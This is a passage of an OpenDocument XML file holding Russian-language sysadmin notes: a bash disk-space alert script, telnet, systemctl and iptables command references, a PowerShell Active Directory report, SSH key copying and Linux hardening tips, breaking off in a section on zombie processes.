      <text:p text:style-name="P27">Скрипт для мониторинга дискового пространства в Linux. Скрипт ниже предназначен для мониторинга использования дискового пространства на указанном разделе сервера. Настраиваемые параметры включают в себя максимально допустимый процент использования дискового пространства (`MAX`), адрес электронной почты для получения оповещений (`EMAIL`) и целевой раздел (`PARTITION`). Скрипт использует команду df для сбора информации об использовании диска и отправляет предупреждения по электронной почте, если текущее использование превышает заданный порог:</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26"># Set the maximum allowed disk space usage percentage</text:p>
      <text:p text:style-name="P26">MAX=90</text:p>
      <text:p text:style-name="P26"># Set the email address to receive alerts</text:p>
      <text:p text:style-name="P26">EMAIL=user@example.com</text:p>
      <text:p text:style-name="P26"># Set the partition to monitor (change accordingly, e.g., /dev/sda1)</text:p>
      <text:p text:style-name="P26">PARTITION=/dev/sda1</text:p>
      <text:p text:style-name="P26"># Get the current disk usage percentage and related information</text:p>
      <text:p text:style-name="P26">USAGE_INFO=$(df -h "$PARTITION" | awk 'NR==2 {print $5, $1, $2, $3, $4}' | tr '\n' ' ')</text:p>
      <text:p text:style-name="P26">USAGE=$(echo "$USAGE_INFO" | awk '{print int($1)}') <text:s/># Remove the percentage sign</text:p>
      <text:p text:style-name="P26">if [ "$USAGE" -gt "$MAX" ]; then</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5"><text:s text:c="2"/># Send an email alert with detailed disk usage information</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>echo -e "Warning: Disk space usage on $PARTITION is $USAGE%.\n\nDisk Usage Information:\n$USAGE_INFO" | \</text:p>
      <text:p text:style-name="P26"><text:soft-page-break/><text:s text:c="4"/>mail -s "Disk Space Alert on $HOSTNAME" "$EMAIL"</text:p>
      <text:p text:style-name="P28">fi</text:p>
      <text:p text:style-name="P26">Список полезных команд для работы с telnet, которые могут помочь при подключении и отладке сетевых служб. Основные команды telnet:</text:p>
      <text:p text:style-name="P26">1) Подключение к удаленному хосту: telnet &lt;hostname&gt; &lt;port&gt;. Пример: <text:s/>telnet example.com 80. Подключается к хосту example.com на порту 80 (HTTP).</text:p>
      <text:p text:style-name="P26">2) Закрытие соединения: Чтобы завершить сессию, используйте сочетание клавиш: Ctrl + ] (переход в режим команд). Затем введите: quit</text:p>
      <text:p text:style-name="P26">3) Отправка текстового запроса после подключения: Если подключились к порту, например, HTTP-сервера, можно отправить запрос вручную: GET / HTTP/1.1. Host: example.com. Это выполняет запрос к домашней странице на порту 80. Встроенные команды telnet (используйте в режиме команд после нажатия `Ctrl + ]`):</text:p>
      <text:p text:style-name="P26">1. help - Показывает список доступных команд telnet: telnet&gt; help</text:p>
      <text:p text:style-name="P26">2. open - Открывает новое соединение с указанным хостом: telnet&gt; open &lt;hostname&gt; &lt;port&gt;</text:p>
      <text:p text:style-name="P26">3. close - Закрывает текущее соединение: telnet&gt; close</text:p>
      <text:p text:style-name="P26">4. display - Показывает текущие параметры подключения: telnet&gt; display</text:p>
      <text:p text:style-name="P26">5. mode - Переключает режим работы telnet (например, line или `character`): telnet&gt; mode line</text:p>
      <text:p text:style-name="P27">6. send - Отправляет управляющие символы (например, send escape для отправки escape-секвенции): telnet&gt; send escape</text:p>
      <text:p text:style-name="P27">7. status - Показывает статус текущего соединения: telnet&gt; status</text:p>
      <text:p text:style-name="P26">8. set и unset - Настраивают параметры подключения (например, установка режима эхо): telnet&gt; set echo telnet&gt; unset echo</text:p>
      <text:p text:style-name="P26">Примеры использования telnet:</text:p>
      <text:p text:style-name="P26">1. Проверка доступности порта: Чтобы проверить, открыт ли порт на удаленном сервере: telnet &lt;hostname&gt; &lt;port&gt;</text:p>
      <text:p text:style-name="P26">2. Проверка почтового сервера (SMTP): Подключение к серверу SMTP: telnet smtp.example.com 25. Затем можно вручную ввести SMTP-команды, такие как: EHLO example.com</text:p>
      <text:p text:style-name="P26">3. Проверка DNS сервера: Можно подключиться к DNS-серверу и проверить его ответы: telnet &lt;dns-server&gt; 53</text:p>
      <text:p text:style-name="P28">Эти команды помогут вам <text:s/>для отладки, диагностики и проверки сетевых служб.</text:p>
      <text:p text:style-name="P26">Powershell суточный отчет по пользователям из ActiveDirectory. Раз в сутки (через планировщик задач) скрипт опрашивает ActiveDirectory на предмет:</text:p>
      <text:p text:style-name="P26">Всего пользователей</text:p>
      <text:p text:style-name="P26">Сколько активных</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Сколько служебных</text:span></text:p>
      <text:p text:style-name="P26">Сколько заблокированных</text:p>
      <text:p text:style-name="P26">Сколько новых</text:p>
      <text:p text:style-name="P26"><text:soft-page-break/>$Date = Get-Date -Format "dd MMMM yyyy HH:mm"</text:p>
      <text:p text:style-name="P26">$AllUsers = (Get-AdUser -Filter * | ?{$_.name -notmatch 'Healthmailbox'}).count</text:p>
      <text:p text:style-name="P26">$ActiveUsers = (Get-ADUser -Filter {Enabled -eq $true} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:p>
      <text:p text:style-name="P26">$DisabledUsers = (Get-ADUser -Filter {Enabled -eq $false} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:p>
      <text:p text:style-name="P26">$StartDate = (Get-Date).AddDays(-1)</text:p>
      <text:p text:style-name="P26">$EndDate <text:s text:c="2"/>= (Get-Date).AddDays(+1)</text:p>
      <text:p text:style-name="P26">$Zapros = Get-ADUser -Filter * -Properties Created | Where-Object {$_.Created -gt $StartDate -and $_.Created -le $EndDate}</text:p>
      <text:p text:style-name="P26">$NewUsers = ($Zapros).count</text:p>
      <text:p text:style-name="P26">$OFS = "`r`n" #`r`n`r`n</text:p>
      <text:p text:style-name="P26">"$($WhoUsers = $Zapros | foreach {$_.Name })"</text:p>
      <text:p text:style-name="P26">$NotSurname = Get-ADUser -filter "Enabled -eq '$true' -and Surname -notlike '*' -and Name -ne 'Healthmailbox'"</text:p>
      <text:p text:style-name="P26">$NotFIO = ($NotSurname).count</text:p>
      <text:p text:style-name="P26">$Message = "На $Date в ActiveDirectory всего пользователей $AllUsers из них: `nАктивных: $ActiveUsers из них служебные: $NotFIO. `nЗаблокированных: $DisabledUsers. `nНовых пользователей: $NewUsers `r`n`r`n$WhoUsers"</text:p>
      <text:p text:style-name="P26">$Message | Out-File -FilePath <text:s/>"C:\temp\$(Get-Date -Format "dd MMMM yyyy")-UsersAD.txt"</text:p>
      <text:p text:style-name="P28">После выполнения получаем файлик с текущей датой в папке temp.</text:p>
      <text:p text:style-name="P26">Запускаем ИИ локально:</text:p>
      <text:p text:style-name="P27">1. llama.cpp (https://github.com/ggerganov/llama.cpp) - интерфейс LLaMA на чистом С/С++, работает локально на вашем процессоре;</text:p>
      <text:p text:style-name="P27">2. Jan (https://github.com/janhq/jan) - альтернатива ChatGPT с открытым исходным кодом, которая на работает 100% оффлайн на вашем ПК;</text:p>
      <text:p text:style-name="P26">3. LocalAI <text:s/>(https://github.com/mudler/LocalAI) - автономный, управляемый сообществом, простой локальный API, совместимый с OpenAI, написанный на языке Go;</text:p>
      <text:p text:style-name="P26">4. ollama <text:s/>(https://github.com/ollama/ollama) - инструмент для работы с <text:s/>Llama 2 и другими крупными языковыми моделями на локальном уровне;</text:p>
      <text:p text:style-name="P26">5. LM Studio - софт для <text:s/>исследования, загрузки и запуска различных больших языковых моделей (LLMs);</text:p>
      <text:p text:style-name="P26">6. llamafile <text:s/>(https://github.com/Mozilla-Ocho/llamafile) - позволяет запускать различные LLM одним файлом;</text:p>
      <text:p text:style-name="P28">7. GPT4ALL <text:s/>(https://www.nomic.ai/gpt4all) - еще одно известное решение для запуска локального ChatGPT.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Простое копирование ssh ключей между серверами c использованием утилиты ssh-copy-id. Традиционно администраторы решают задачу копирования ssh ключей между серверами путем копирования содержимого файла </text:span><text:soft-page-break/><text:span text:style-name="T5">/root/.ssh/id_rsa.pub с сервера server1 на server2 в файл /root/.ssh/authorized_keys. Копируют обычно из одного терминала в другой, но есть более изящное решение - это использование утилиты ssh-copy-id, которая позволяет скопировать содержимое id_rsa.pub сервера источник (в нашем случае server1) на сервер приемник (server2) в нужный нам authorized_keys не открывая консоль сервера приемника (server2). Исходные данные: 2 сервера с Debian (server1 и server2). Задача: Организовать вход по ssh ключу с сервера server1 на server2 с правами root. Итак сделаем все по порядку: 1. Генерируем публичный открытый и закрытый ключи, под пользователем root на server1: ssh-keygen -t rsa. Если на сервере уже есть эти ключи, то он выдаст предупреждение, где нужно будет либо подтвердить замену старых ключей либо отказаться. Мы создаем ключи впервые, поэтому предупреждения не будет, будет выведена примерно такая информация:</text:span></text:p>
      <text:p text:style-name="P26">Generating public/private rsa key pair.</text:p>
      <text:p text:style-name="P26">Enter file in which to save the key (/root/.ssh/id_rsa): &lt;-- ENTER</text:p>
      <text:p text:style-name="P26">Created directory '/root/.ssh'.</text:p>
      <text:p text:style-name="P26">Enter passphrase (empty for no passphrase): &lt;-- ENTER</text:p>
      <text:p text:style-name="P26">Enter same passphrase again: &lt;-- ENTER</text:p>
      <text:p text:style-name="P26">Your identification has been saved in /root/.ssh/id_rsa.</text:p>
      <text:p text:style-name="P26">Your public key has been saved in /root/.ssh/id_rsa.pub.</text:p>
      <text:p text:style-name="P26">Вы можете защитить приватный ключ паролем и тогда чтобы попасть на сервер server2 по ssh ключу нужно будет ввести этот пароль, я настоятельно рекомендую для доступа с уровнем root ввести пароль на приватный ключ. Ключи сгенерированы, мы можем проверить под пользователем root выполнив команду cat ~/.ssh/id_rsa.pub</text:p>
      <text:p text:style-name="P26">В ответ увидим примерно: ssh-rsa AAAAB3Nz.....ywWmpl root@server1</text:p>
      <text:p text:style-name="P26">Теперь нужно передать публичный ключ id_rsa.pub пользователя root на server2, для этого на server1 выполняем: ssh-copy-id -i ~/.ssh/id_rsa.pub root@server2</text:p>
      <text:p text:style-name="P27">Вводим пароль root от сервера server2 и ключ будет передан и записан в нужный файл authorized_keys. Важное уточнение: Чтобы передать публичный ключ на server2 под root нужно чтобы пользователю root было разрешен вход по ssh на server2, обычно при базовой установке Debian/Ubuntu вход под root по ssh разрешен, это настраивается директивой PermitRootLogin в файле /etc/ssh/sshd_config</text:p>
      <text:p text:style-name="P27">PermitRootLogin yes - Вход под root по ssh разрешен.</text:p>
      <text:p text:style-name="P26">PermitRootLogin no - Вход под root по ssh запрещен.</text:p>
      <text:p text:style-name="P26">PermitRootLogin without-password - Вход под root по ssh разрешен только по ssh ключам.</text:p>
      <text:p text:style-name="P26">PermitRootLogin forced-commands-only - Вход под root по ssh разрешен только по ssh ключам и только для выполнения заранее определенной команды, сама команда прописывается в /root/.ssh/authorized_keys в формате:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">command="rsync" ssh-rsa AAAAB3N……. root@server2</text:span></text:p>
      <text:p text:style-name="P28">После изменения PermitRootLogin не забудьте перезапустить службу sshd командой: service sshd restart</text:p>
      <text:p text:style-name="P26"><text:soft-page-break/>Как защитить сервер Linux?</text:p>
      <text:p text:style-name="P26">1. Обновление системы: Регулярно обновляйте систему и программное обеспечение:</text:p>
      <text:p text:style-name="P26">sudo apt update &amp;&amp; sudo apt upgrade -y # Для Debian/Ubuntu</text:p>
      <text:p text:style-name="P26">sudo yum update -y # Для CentOS/RHEL</text:p>
      <text:p text:style-name="P26">Включите автоматические обновления безопасности.</text:p>
      <text:p text:style-name="P26">2. Настройка брандмауэра: Используйте ufw (Uncomplicated Firewall) или firewalld для управления входящими и исходящими соединениями:</text:p>
      <text:p text:style-name="P26">sudo ufw enable</text:p>
      <text:p text:style-name="P26">sudo ufw allow ssh # Разрешить SSH</text:p>
      <text:p text:style-name="P26">sudo ufw allow http # Разрешить HTTP</text:p>
      <text:p text:style-name="P26">sudo ufw allow https # Разрешить HTTPS</text:p>
      <text:p text:style-name="P26">Запретите все неиспользуемые порты.</text:p>
      <text:p text:style-name="P26">3. Защита SSH: Измените порт SSH по умолчанию (22): sudo nano /etc/ssh/sshd_config; Измените строку Port 22 на другой порт; Отключите вход под root: PermitRootLogin no; Используйте аутентификацию по ключу вместо пароля: PasswordAuthentication no; Ограничьте доступ по IP: AllowUsers user@your_ip</text:p>
      <text:p text:style-name="P26">4. Управление пользователями и правами: Создавайте отдельных пользователей с ограниченными правами для выполнения задач; Используйте sudo вместо входа под root; Регулярно проверяйте список пользователей и удаляйте ненужные учетные записи: sudo deluser username</text:p>
      <text:p text:style-name="P26">5. Установка и настройка Fail2Ban: Fail2Ban блокирует IP-адреса после нескольких неудачных попыток входа:</text:p>
      <text:p text:style-name="P26">sudo apt install fail2ban <text:s/># Для Debian/Ubuntu</text:p>
      <text:p text:style-name="P26">sudo yum install fail2ban <text:s/># Для CentOS/RHEL</text:p>
      <text:p text:style-name="P26">Настройте конфигурацию для SSH и других сервисов.</text:p>
      <text:p text:style-name="P26">6. Отключение ненужных сервисов: Удалите или остановите неиспользуемые сервисы:</text:p>
      <text:p text:style-name="P26">sudo systemctl stop service_name</text:p>
      <text:p text:style-name="P26">sudo systemctl disable service_name</text:p>
      <text:p text:style-name="P26">7. Использование SELinux/AppArmor: Включите SELinux (для CentOS/RHEL) или AppArmor (для Debian/Ubuntu) для усиления безопасности:</text:p>
      <text:p text:style-name="P26">sudo setenforce 1 <text:s/># Для SELinux</text:p>
      <text:p text:style-name="P27">sudo systemctl enable apparmor <text:s/># Для AppArmor</text:p>
      <text:p text:style-name="P27">8. Регулярное резервное копирование: Настройте автоматическое резервное копирование важных данных; Храните резервные копии на отдельном сервере или в облаке.</text:p>
      <text:p text:style-name="P26">9. Мониторинг и логирование</text:p>
      <text:p text:style-name="P26">Используйте инструменты мониторинга, такие как htop, nmon или Prometheus.Регулярно проверяйте логи:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">sudo tail -f /var/log/auth.log <text:s/># Логи аутентификации</text:span></text:p>
      <text:p text:style-name="P26">sudo tail -f /var/log/syslog <text:s text:c="3"/># Системные логи</text:p>
      <text:p text:style-name="P26"><text:soft-page-break/>10. Шифрование данных: Используйте шифрование дисков (LUKS) для защиты данных; Настройте SSL/TLS для всех сервисов, работающих с данными.</text:p>
      <text:p text:style-name="P28">11. Аудит безопасности: Используйте инструменты для сканирования уязвимостей, такие как Lynis или OpenSCAP: sudo lynis audit system</text:p>
      <text:p text:style-name="P26">Подборка инструментов для шифрования и хэширования данных. Основная задача хеширования - создать уникальный цифровой «отпечаток» данных, который поможет ускорить обработку информации, защитить её от взлома и упростить идентификацию:</text:p>
      <text:p text:style-name="P26">1. OpenSSL: (https://github.com/openssl/openssl) Широкопрофильная библиотека с реализациями протоколов SSL и TLS, а также инструментов для шифрования, расшифровки, хэширования и управления сертификатами.</text:p>
      <text:p text:style-name="P26">2. Libsodium: (https://github.com/jedisct1/libsodium) Легковесная, высокопроизводительная библиотека для криптографии с простым API для безопасной разработки приложений.</text:p>
      <text:p text:style-name="P26">3. PyCryptodome: (https://github.com/Legrandin/pycryptodome) Библиотека для Python, предлагающая различные криптографические алгоритмы, включая AES, DES, RSA, хэширование и многое другое.</text:p>
      <text:p text:style-name="P26">4. CryptoJS: (https://github.com/brix/crypto-js) Библиотека для JavaScript, позволяющая осуществлять шифрование и хэширование с использованием различных алгоритмов, таких как AES, SHA256 и другие.</text:p>
      <text:p text:style-name="P28">5. bcrypt: (https://github.com/kelektiv/node.bcrypt.js) Библиотека для Node.js и JavaScript, предназначенная для безопасного хэширования паролей с использованием алгоритма bcrypt.</text:p>
      <text:p text:style-name="P26">Работа с файлами и папками PowerShell. Перечисление всех файлов и папок в папке. Все элементы можно получить непосредственно в папке с помощью Get-ChildItem. Для отображения скрытых и системных элементов добавьте необязательный параметр Force. Например, эта команда отображает прямое содержимое диска C:PowerShell: Get-ChildItem -Path C:\ -Force</text:p>
      <text:p text:style-name="P26">Команда перечисляет только непосредственно содержащиеся элементы, например команду dir в cmd.exe оболочке UNIX или ls в ней. Чтобы отобразить элементы в вложенной папке, необходимо указать параметр Recurse . Следующая команда выводит список всех элементов на C: диске: Get-ChildItem -Path C:\ -Force -Recurse</text:p>
      <text:p text:style-name="P26">Командлет Get-ChildItem позволяет отфильтровать элементы с помощью параметров Path, Filter, Include и Exclude, но обычно осуществляется лишь фильтрация по имени. Вы можете выполнять сложную фильтрацию на основе других свойств элементов с помощью Where-Object.</text:p>
      <text:p text:style-name="P29">Следующая команда находит все исполняемые файлы в папке Program Files, которые были изменены после 1 октября 2005 года, и они не меньше 1 мегабайт или больше 10 мегабайт:</text:p>
      <text:p text:style-name="P26">Get-ChildItem -Path $env:ProgramFiles -Recurse -Include *.exe |</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Where-Object -FilterScript {</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>($_.LastWriteTime -gt '2005-10-01') -and ($_.Length -ge 1mb) -and ($_.Length -le 10mb)</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P26">Копирование файлов и папок. Копирование выполняется с помощью командлета Copy-Item. Следующая команда создает резервную копию скрипта профиля PowerShell:</text:p>
      <text:p text:style-name="P26">if (Test-Path -Path $PROFILE) {</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Copy-Item -Path $PROFILE -Destination $($PROFILE -replace 'ps1$', 'bak')</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">Команда Test-Path проверка, существует ли скрипт профиля. Если целевой файл уже существует, то попытка копирования завершается неудачей. Чтобы перезаписать имеющийся целевой файл, используйте параметр Force.</text:p>
      <text:p text:style-name="P26">if (Test-Path -Path $PROFILE) {</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Copy-Item -Path $PROFILE -Destination $($PROFILE -replace 'ps1$', 'bak') -Force</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">Эта команда работает, даже если целевой объект доступен только для чтения. Так же выполняется и копирование папок. Эта команда копирует папку C:\temp\test1 в новую папку C:\temp\DeleteMe рекурсивно: Copy-Item C:\temp\test1 -Recurse C:\temp\DeleteMe</text:p>
      <text:p text:style-name="P26">Можно также скопировать избранные элементы. Следующая команда копирует все .txt файлы, содержащиеся в любом месте в C:\dataC:\temp\text: Copy-Item -Filter *.txt -Path c:\data -Recurse -Destination C:\temp\text</text:p>
      <text:p text:style-name="P26">Вы по-прежнему можете выполнять собственные команды, такие как xcopy.exe и robocopy.exe копировать файлы.</text:p>
      <text:p text:style-name="P26">Создание файлов и папок. Создание новых элементов работает одинаково для всех поставщиков PowerShell. Если поставщик PowerShell имеет несколько типов элементов, например поставщик FileSystem PowerShell различает каталоги и файлы, необходимо указать тип элемента. Эта команда создает папку C:\temp\New Folder: New-Item -Path 'C:\temp\New Folder' -ItemType Directory</text:p>
      <text:p text:style-name="P26">Эта команда создает пустой файл C:\temp\New Folder\file.txt: New-Item -Path 'C:\temp\New Folder\file.txt' -ItemType File</text:p>
      <text:p text:style-name="P26">Удаление всех файлов и папок в папке. Удалить вложенные элементы можно с помощью командлета Remove-Item, однако он потребует подтверждения удаления, если элемент сам что-нибудь содержит. Например, если вы попытаелись удалить папку C:\temp\DeleteMe , содержащую другие элементы, PowerShell запрашивает подтверждение перед удалением папки: Remove-Item -Path C:\temp\DeleteMe</text:p>
      <text:p text:style-name="P24"><text:soft-page-break/><text:span text:style-name="T5">Если вам не нужно запрашивать каждый содержащийся элемент, укажите параметр Recurse: Remove-Item -Path C:\temp\DeleteMe -Recurse</text:span></text:p>
      <text:p text:style-name="P27">Всё о монтировании: от системного администрирования до IT криминалистики. Монтирование в Linux позволяет получить доступ к содержимому диска и организовать структуру файловой системы. С помощью монтирования также можно открыть для работы образ диска (например, созданного с помощью программы dd (https://zalinux.ru/?p=5137)), (https://zalinux.ru/?p=5137) а также открыть для доступа и редактирования самые разные файловые системы и образы дисков (например, образы дисков виртуальных машин):</text:p>
      <text:p text:style-name="P26">1. Основы монтирования и использования команды mount (https://hackware.ru/?p=14459#1)</text:p>
      <text:p text:style-name="P26">2. Монтирование образов дисков и доступ к файлам на них (https://hackware.ru/?p=14459#2)</text:p>
      <text:p text:style-name="P26">3. Таблица файловых систем /etc/fstab (https://hackware.ru/?p=14459#3)</text:p>
      <text:p text:style-name="P26">4. Доступ к содержимому дисков виртуальных машин и их изменение (https://hackware.ru/?p=14459#4)</text:p>
      <text:p text:style-name="P26">5. Файловая система в оперативной памяти (https://hackware.ru/?p=14459#5)</text:p>
      <text:p text:style-name="P26">6. Автоматическое монтирование и его отключение (https://hackware.ru/?p=14459#6)</text:p>
      <text:p text:style-name="P26">7. Монтирование сетевых файловых систем (https://hackware.ru/?p=14459#7)</text:p>
      <text:p text:style-name="P28">8. Опции команды mount и опции монтирования (https://hackware.ru/?p=14459#8)</text:p>
      <text:p text:style-name="P26">Управление сервисами systemd через systemctl. 1. Основные команды для управления сервисами. Используем команду systemctl для управления сервисами (демонами) в systemd. Запуск, остановка и перезапуск сервиса:</text:p>
      <text:p text:style-name="P26">sudo systemctl start &lt;service&gt; <text:s text:c="3"/># Запуск сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl stop &lt;service&gt; <text:s text:c="4"/># Остановка сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl restart &lt;service&gt; <text:s/># Перезапуск сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl reload &lt;service&gt; <text:s text:c="2"/># Перезагрузка конфигурации (без остановки)</text:p>
      <text:p text:style-name="P26">Включение и отключение автозапуска:</text:p>
      <text:p text:style-name="P26">sudo systemctl enable &lt;service&gt; <text:s text:c="3"/># Включить автозапуск сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl disable &lt;service&gt; <text:s text:c="2"/># Отключить автозапуск сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl is-enabled &lt;service&gt; <text:s/># Проверить статус автозапуска</text:p>
      <text:p text:style-name="P26">Проверка состояния сервиса:</text:p>
      <text:p text:style-name="P26">systemctl status &lt;service&gt; <text:s text:c="2"/># Проверить текущее состояние сервиса</text:p>
      <text:p text:style-name="P26">journalctl -u &lt;service&gt; <text:s text:c="5"/># Просмотреть логи сервиса</text:p>
      <text:p text:style-name="P26">Проверка запущенных сервисов:</text:p>
      <text:p text:style-name="P26">systemctl list-units --type=service --state=running <text:s/># Вывести запущенные сервисы</text:p>
      <text:p text:style-name="P26">systemctl list-units --type=service <text:s text:c="16"/># Все загруженные сервисы</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">2. Работа с юнитами systemd. Каждый сервис в systemd представлен в виде юнита (`.service`). Перезапуск systemd и перечитывание конфигурации:</text:span></text:p>
      <text:p text:style-name="P26">sudo systemctl daemon-reexec <text:s text:c="2"/># Перезапуск systemd без перезапуска сервисов</text:p>
      <text:p text:style-name="P26">sudo systemctl daemon-reload <text:s text:c="2"/># Обновить конфигурацию systemd после изменения юнитов</text:p>
      <text:p text:style-name="P26">Редактирование юнитов сервисов:</text:p>
      <text:p text:style-name="P26">sudo systemctl edit &lt;service&gt; <text:s text:c="2"/># Изменить конфигурацию юнита (создает override)</text:p>
      <text:p text:style-name="P26">sudo systemctl cat &lt;service&gt; <text:s text:c="3"/># Просмотреть конфигурацию юнита</text:p>
      <text:p text:style-name="P27">Удаление override-конфигурации: sudo systemctl revert &lt;service&gt;</text:p>
      <text:p text:style-name="P27">3. Дополнительные команды. Маскировка и размаскировка сервиса:</text:p>
      <text:p text:style-name="P26">sudo systemctl mask &lt;service&gt; <text:s text:c="2"/># Полностью отключить сервис (даже если включен)</text:p>
      <text:p text:style-name="P26">sudo systemctl unmask &lt;service&gt; # Разрешить сервис (после mask)</text:p>
      <text:p text:style-name="P26">Выключение и перезагрузка системы через systemd:</text:p>
      <text:p text:style-name="P26">sudo systemctl reboot <text:s text:c="4"/># Перезагрузка системы</text:p>
      <text:p text:style-name="P26">sudo systemctl poweroff <text:s text:c="2"/># Выключение системы</text:p>
      <text:p text:style-name="P26">sudo systemctl suspend <text:s text:c="3"/># Усыпление системы</text:p>
      <text:p text:style-name="P26">sudo systemctl halt <text:s text:c="6"/># Остановка системы без выключения питания</text:p>
      <text:p text:style-name="P26">4. Примеры работы. Запуск и настройка сервиса Nginx:</text:p>
      <text:p text:style-name="P26">sudo systemctl start nginx <text:s text:c="6"/># Запускаем сервис</text:p>
      <text:p text:style-name="P26">sudo systemctl enable nginx <text:s text:c="5"/># Включаем автозапуск</text:p>
      <text:p text:style-name="P26">systemctl status nginx <text:s text:c="10"/># Проверяем статус</text:p>
      <text:p text:style-name="P26">journalctl -u nginx --no-pager <text:s text:c="2"/># Просматриваем логи</text:p>
      <text:p text:style-name="P26">Остановка и отключение сервиса Apache:</text:p>
      <text:p text:style-name="P26">sudo systemctl stop apache2 <text:s text:c="5"/># Остановка сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl disable apache2 <text:s text:c="2"/># Отключение автозапуска</text:p>
      <text:p text:style-name="P26">sudo systemctl mask apache2 <text:s text:c="5"/># Полностью блокируем его запуск</text:p>
      <text:p text:style-name="P26">Полезные флаги systemctl</text:p>
      <text:p text:style-name="P26">Флаг <text:s text:c="25"/>Описание</text:p>
      <text:p text:style-name="P26">--no-pager <text:s text:c="12"/>Вывод без постраничного просмотра</text:p>
      <text:p text:style-name="P26">--failed <text:s text:c="17"/>Показывает только сбойные юниты</text:p>
      <text:p text:style-name="P26">--type=service <text:s text:c="3"/>Фильтр по типу "service"</text:p>
      <text:p text:style-name="P26">--all <text:s text:c="18"/>Показывает все юниты, включая неактивные</text:p>
      <text:p text:style-name="P31" loext:marker-style-name="T6"/>
      <text:p text:style-name="P26">Полезные команды Linux. Фаервол IPTABLES, штатный, для большинства дистрибутивов Linux:</text:p>
      <text:p text:style-name="P26">iptables -t filter -L - Вывести список всец цепочек правил</text:p>
      <text:p text:style-name="P26">iptables -t nat -L - Вывести все цепочки из NAT таблицы</text:p>
      <text:p text:style-name="P26">iptables -t nat -F - Очистить все цепочки правил в таблице NAT</text:p>
      <text:p text:style-name="P26">iptables -t filter -X - Очистить все пользовательские цепочки правил в таблице filter</text:p>
      <text:p text:style-name="P26">iptables -t filter -F - Очистить все цепочки правил в таблице filter</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">iptables -t filter -A INPUT -p tcp --dport telnet -j ACCEPT - Разрешить входящие соединения с telnet</text:span></text:p>
      <text:p text:style-name="P26">iptables -t filter -A OUTPUT -p tcp --dport http -j DROP - Запретить исходящие HTTP соединения</text:p>
      <text:p text:style-name="P26">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE - включить NAT (Network Address Translate) исходящих пакетов на интерфейс eth0. Допустимо при использовании с динамически выделяемыми ip-адресами.</text:p>
      <text:p text:style-name="P26">iptables -t nat -A PREROUTING -d 192.168.0.1 -p tcp -m tcp --dport 22 -j DNAT --to-destination 10.0.0.2:22 - Пересылка пакетов, адресованных одному хосту, на другой хост</text:p>
      <text:p text:style-name="P27">iptables -t filter -A INPUT -j LOG --log-prefix - Включить логгирование пакетов, проходящих через цепочку INPUT, и добавлением к сообщению префикса "DROP INPUT"</text:p>
      <text:p text:style-name="P27">iptables -t filter -A FORWARD -p tcp --dport pop3 -j ACCEPT - Разрешить форвардинг POP3 соединений</text:p>
      <text:p text:style-name="P26">Как вывести список установленных пакетов в Linux по дате? В Linux можно вывести список установленных пакетов с датой установки с помощью различных инструментов, в зависимости от используемого менеджера пакетов. </text:p>
      <text:p text:style-name="P26">1. Для Debian/Ubuntu (dpkg и apt): grep "install " /var/log/dpkg.log ИЛИ если лог-файл архивирован: zgrep "install " /var/log/dpkg.log.*</text:p>
      <text:p text:style-name="P26">Для более удобного вывода: grep "install " /var/log/dpkg.log | awk '{print $1, $2, $5}'</text:p>
      <text:p text:style-name="P26">Если система использует journalctl: journalctl -u apt --no-pager | grep "install "</text:p>
      <text:p text:style-name="P26">2. Для RHEL, CentOS, Fedora (dnf, yum). Список установленных пакетов по дате: rpm -qa --last ИЛИ: rpm -qa --queryformat '%{installtime} %{installtime:date} %{name}-%{version}-%{release}\n' | sort -n</text:p>
      <text:p text:style-name="P26">Если используется dnf: dnf history list</text:p>
      <text:p text:style-name="P26">Чтобы получить подробности о конкретной транзакции: dnf history info &lt;ID_транзакции&gt;</text:p>
      <text:p text:style-name="P26">А для yum: yum history list all</text:p>
      <text:p text:style-name="P26">3. Для Arch Linux (pacman): expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort -n ИЛИ: grep -E 'installed' /var/log/pacman.log</text:p>
      <text:p text:style-name="P26">4. Для OpenSUSE (zypper): zypper info --installed-only | grep -B 2 "Install Date"</text:p>
      <text:p text:style-name="P26">Вывод в удобном формате. Если нужно отсортировать пакеты по дате и времени: rpm -qa --queryformat '%{installtime:date} %{name}\n' | sort</text:p>
      <text:p text:style-name="P28">Для Debian/Ubuntu: grep "install " /var/log/dpkg.log | awk '{print $1, $2, $5}' | sort</text:p>
      <text:p text:style-name="P26">Как убрать зомби-процессы в Linux. Зомби-процессы (zombie processes) в Linux - это процессы, которые завершились, но их родительский процесс не вызвал wait() для очистки их записи в таблице процессов. Они не используют ресурсы процессора или памяти, но могут засорять таблицу процессов, создавая проблемы при большом их количестве.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">1) Поиск зомби-процессов. Используйте одну из следующих команд: ps aux | awk '$8=="Z" {print $2, $11}' или ps -eo pid,ppid,stat,cmd | grep 'Z' или с использованием top: Откройте top и нажмите Z (или посмотрите столбец STAT, где зомби-процессы помечены `Z`).</text:span></text:p>
      <text:p text:style-name="P26">2) Удаление зомби-процессов:</text:p>
